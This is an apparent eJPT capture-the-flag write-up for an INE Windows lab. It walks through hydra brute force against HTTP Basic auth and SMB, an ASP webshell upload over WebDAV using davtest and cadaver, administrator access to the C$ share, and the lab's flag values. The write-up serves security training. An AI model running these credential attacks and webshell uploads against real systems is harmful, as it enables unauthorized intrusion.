# Windows Host and Network Penetration Testing CTF - INE eJPT

INE multi-target Windows CTF. Target1 exposes a password-protected web server with a WebDAV directory; target2 has SMB with no anonymous access. Both require credential brute force before any further access is possible. Four flags distributed across both targets.

Targets: `target1.ine.local` | `target2.ine.local`

---

## Target 1 - WebDAV Exploitation

### Reconnaissance

```bash
nmap -sC -sV target1.ine.local
```

Port 80 open - web server returning HTTP 401 Unauthorized.

### Credential Brute Force (HTTP Basic Auth)

User `bob` is indicated by context. Brute force the password:

```bash
hydra -l bob \
  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
  target1.ine.local http-get /
```

Valid credentials recovered.

### Directory Enumeration

```bash
dirb http://target1.ine.local -u bob:<password>
```

Directory `/webdav` discovered.

### WebDAV Enumeration

```bash
davtest -auth bob:<password> \
  -url http://target1.ine.local/webdav
```

`.asp` file uploads are permitted.

### ASP Webshell Upload

```bash
cadaver http://target1.ine.local/webdav
# authenticate with bob:<password>
put /usr/share/webshells/asp/webshell.asp
exit
```

Navigate to `http://target1.ine.local/webdav/webshell.asp` to access the web shell.

## Flag 1

Flag file visible directly in the WebDAV directory listing.

```
4ccc8664b99f44158dd3e42c46ae39eb
```

## Flag 2 - Filesystem Enumeration

From the web shell:

```
dir C:\
type C:\flag2.txt
```

```
f4369f68b4c049dd8ffe0d2f545ddb2f
```

---

## Target 2 - SMB Credential Attack

### Reconnaissance

```bash
nmap -sC -sV target2.ine.local
enum4linux -a target2.ine.local
```

SMB active on port 445. No anonymous access.

### Credential Brute Force

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
  smb://target2.ine.local
```

Valid credentials recovered for `administrator`.

### Share Access

```bash
crackmapexec smb target2.ine.local \
  -u administrator -p <password> --shares
```

`ADMIN$` and `C$` shares accessible with read-write permissions.

```bash
smbclient //target2.ine.local/C$ -U administrator
```

## Flag 3

```
get flag3.txt
```

```
79b87a8ef8724d9997c774aadaf360a4
```

## Flag 4 - Desktop Enumeration

```
cd Users\Administrator\Desktop\
get flag4.txt
```

```
b3fa315c074d4fa2b7706b22aea22f78
```

---

## Key Takeaways

- WebDAV on IIS is a potent attack vector when authentication is weak. `davtest` identifies which file types are uploadable before attempting any payload.
- `cadaver` is the command-line WebDAV client for interactive file operations. Combined with an ASP webshell, it provides remote code execution without needing an exploit.
- `crackmapexec` maps share permissions across a Windows target in a single command - use it before attempting direct `smbclient` connections to understand what is accessible.
- Credential quality matters more than technique: weak passwords on administrator accounts make both WebDAV and SMB attacks trivial.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
